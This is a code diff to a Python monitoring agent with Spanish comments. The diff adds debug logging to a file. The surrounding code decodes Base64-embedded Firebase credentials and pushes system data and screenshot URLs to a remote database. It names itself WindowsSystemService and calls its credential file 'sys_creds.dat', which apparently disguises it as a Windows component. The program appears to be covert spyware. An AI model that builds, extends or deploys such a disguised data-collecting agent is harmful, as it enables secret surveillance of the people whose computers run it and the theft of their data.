@@ -4,6 +4,7 @@ import threading
 import psutil
 import requests
 import json
+import logging
 import os
 import sys
 import base64  # <--- NUEVO
@@ -24,13 +25,26 @@ def get_base_dir():
         # Estamos ejecutando el script con python
         return os.path.dirname(os.path.abspath(__file__))
 
+# Configurar logging a archivo
+log_path = os.path.join(get_base_dir(), "agent.log")
+logging.basicConfig(
+    filename=log_path,
+    level=logging.DEBUG,
+    format='%(asctime)s - %(levelname)s - %(message)s'
+)
+logging.info("=== AGENTE INICIADO ===")
+logging.info(f"Directorio base: {get_base_dir()}")
+
 
 def crear_credenciales():
     """Decodifica el Base64 de sys_config.py y escribe sys_creds.dat"""
+    logging.info("Intentando crear/leer sys_creds.dat")
     cred_file = os.path.join(get_base_dir(), "sys_creds.dat")
+    logging.info(f"Ruta del archivo de credenciales: {cred_file}")
     
     # Si ya existe y tiene datos, lo usamos
     if os.path.exists(cred_file):
+        logging.info("sys_creds.dat ya existe, validando contenido")
         try:
             with open(cred_file, "r") as f:
                 content = f.read().strip()
@@ -42,19 +56,21 @@ def crear_credenciales():
             pass  # Si está corrupto, lo regeneramos
 
     try:
-        print("[*] Generando sys_creds.dat desde Base64...")
+        logging.info("Generando sys_creds.dat desde Base64...")
         # Decodificar el Base64
         json_bytes = base64.b64decode(config.CREDS_B64)
         json_str = json_bytes.decode('utf-8')
+        logging.info("Base64 decodificado correctamente")
         
         # Validar que es JSON válido
         data = json.loads(json_str)
+        logging.info("JSON de credenciales validado")
         
         # Escribir el archivo (SIN BOM, UTF-8 puro)
         with open(cred_file, "w", encoding='utf-8') as f:
             json.dump(data, f, indent=2)
         
-        print("[✓] sys_creds.dat creado correctamente desde Base64")
+        logging.info("sys_creds.dat creado correctamente desde Base64")
         return True
         
     except Exception as e:
@@ -83,6 +99,7 @@ class WindowsSystemService:
                 'databaseURL': config.FIREBASE_DB_URL
             })
             print("[✓] Servicio de sincronización iniciado")
+            logging.info("Firebase inicializado correctamente")
         except Exception as e:
             print(f"[!] Error en servicio de sincronización: {e}")
             sys.exit(1)
@@ -174,6 +191,7 @@ class WindowsSystemService:
             }
             if metadata:
                 data['metadata'] = metadata
+            logging.info(f"Enviando datos a Firebase: {data}")
             ref.child('historial').push(data)
             ref.child('ultima').set(data)
             if screenshot_url:
@@ -185,6 +203,7 @@ class WindowsSystemService:
             return False
 
     def ciclo_principal(self):
+        logging.info("Ciclo principal iniciado")
         print("[*] Servicio del sistema activo - Monitoreando...")
         print(f"[*] Versión: {config.VERSION_ACTUAL}")
         print(f"[*] Intervalo de sincronización: {config.SYNC_INTERVAL} segundos")
